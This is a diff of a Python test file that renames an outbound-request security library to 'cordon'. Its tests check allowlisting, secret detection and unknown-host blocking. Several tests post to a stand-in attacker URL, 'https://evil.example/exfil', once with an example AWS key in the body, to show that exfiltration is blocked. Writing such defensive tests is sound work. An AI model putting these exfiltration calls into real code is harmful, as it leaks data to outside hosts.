@@ -2,8 +2,8 @@ import json
 
 import pytest
 
-import egress_security
-from egress_security import EgressSecurityDenied
+import cordon
+from cordon import CordonDenied
 
 requests = pytest.importorskip("requests")
 responses = pytest.importorskip("responses")
@@ -38,12 +38,12 @@ POLICY = {
 @pytest.fixture(autouse=True)
 def _clean():
     yield
-    egress_security.uninstall()
+    cordon.uninstall()
 
 
 @responses.activate
 def test_allowed_request_passes_through(tmp_path):
-    egress_security.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
+    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
     responses.add(
         responses.GET,
         "https://api.github.com/repos/a/b",
@@ -58,8 +58,8 @@ def test_allowed_request_passes_through(tmp_path):
 
 
 def test_secret_in_body_denied(tmp_path):
-    egress_security.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
-    with pytest.raises(EgressSecurityDenied) as exc:
+    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
+    with pytest.raises(CordonDenied) as exc:
         requests.post(
             "https://api.github.com/leak",
             json={"creds": "AKIAIOSFODNN7EXAMPLE"},
@@ -72,8 +72,8 @@ def test_secret_in_body_denied(tmp_path):
 
 
 def test_unknown_host_denied(tmp_path):
-    egress_security.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
-    with pytest.raises(EgressSecurityDenied) as exc:
+    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
+    with pytest.raises(CordonDenied) as exc:
         requests.post("https://evil.example/exfil", json={"x": 1})
     assert exc.value.rule_id == "block-unknown-host"
 
@@ -83,7 +83,7 @@ def test_requests_shim_skipped_for_pygithub_calls(tmp_path):
     """When github_shim has already governed a call, the requests catch-all
     must NOT double-evaluate. This is what the vendor_scope reentrancy guard
     is for."""
-    egress_security.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
+    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
     responses.add(
         responses.GET,
         "https://api.github.com:443/repos/a/b",
@@ -115,8 +115,8 @@ def test_requests_shim_skipped_for_pygithub_calls(tmp_path):
 
 @responses.activate
 def test_uninstall_removes_patch(tmp_path):
-    egress_security.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
-    egress_security.uninstall()
+    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
+    cordon.uninstall()
     responses.add(
         responses.POST,
         "https://evil.example/exfil",
